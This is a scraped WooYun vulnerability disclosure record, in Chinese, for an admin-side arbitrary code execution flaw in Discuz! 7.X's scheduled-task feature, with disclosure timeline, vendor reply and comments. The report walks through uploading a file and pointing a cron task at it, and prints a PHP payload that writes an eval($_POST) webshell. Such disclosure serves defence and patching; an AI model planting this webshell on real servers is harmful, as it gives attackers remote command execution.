{"id": 8592, "wybug_id": "wooyun-2013-033063", "wybug_title": "Discuz!7.X后台任意代码执行", "wybug_corp": "Discuz!", "wybug_author": "vakin", "wybug_date": "2013-07-31 22:07", "wybug_open_date": "2013-10-29 22:08", "wybug_type": "命令执行", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-10-29：\t细节向公众公开  简要描述： Discuz!7.X后台设置不严格导致任意代码执行获得webshell 详细说明：  \n\n由于计划任务功能没有对文件名做任何限制导致只需要把文件上传到/include/crons/目录就可以执行   漏洞证明：  首先到全局附件设置修改上传目录\n\n然后直接拿他本身存在的计划任务件/include/crons/announcements_daily.inc.php修改内容为\n<?php/*\t[Discuz!] (C)2001-2009 Comsenz Inc.\tThis is NOT a freeware, use is subject to license terms\t$Id: announcements_daily.inc.php 17476 2008-12-25 02:58:18Z liuqiang $*/if(!defined('IN_DISCUZ')) {\texit('Access Denied');}fputs(fopen('1.php','w'),'<?php eval($_POST[cmd)?>\\r\\n');?>\n我是保存的11.txt,到论坛任意可以上传文件的板块发表新帖上传\n\n到后台在附件管理可以获得上传的路径和文件名\n\n我这里显示的是1307312134da261a93f37e3656.txt,记住这个文件名把他写到计划任务里\n\n提交后点执行1.php就在根目录生成了   修复方案：  强制计划任务文件后缀为php   版权声明：转载请注明来源 vakin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-08-01 16:43 厂商回复： 问题我们已经确认，感谢您的支持，我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-07-31 22:11 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  神奇的路人甲    \n     2013-07-31 22:27 |    \t\t有妹子送上 \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:28        | 杭州最帅的男人)\t\t \n  神奇的路人甲    \n     2013-07-31 22:37 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  神奇的路人假    \n     2013-07-31 23:58 |    \t\t萧然 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 喜欢一切美丽的东西！)\t\t \n  大了    \n     2013-08-01 13:42 |    \t\t辣辣飞侠 \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:1        | 维护网络安全从我做起)\t\t \n  神奇的路人假    \n     2013-08-22 10:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个给力啊    \n     2013-09-11 00:38 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  mark~自评rank好低……    \n     2013-09-12 09:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  这个挺给力    \n     2013-12-11 22:40 |    \t\t炯炯虾 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我来自地球)\t\t \n  给力    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}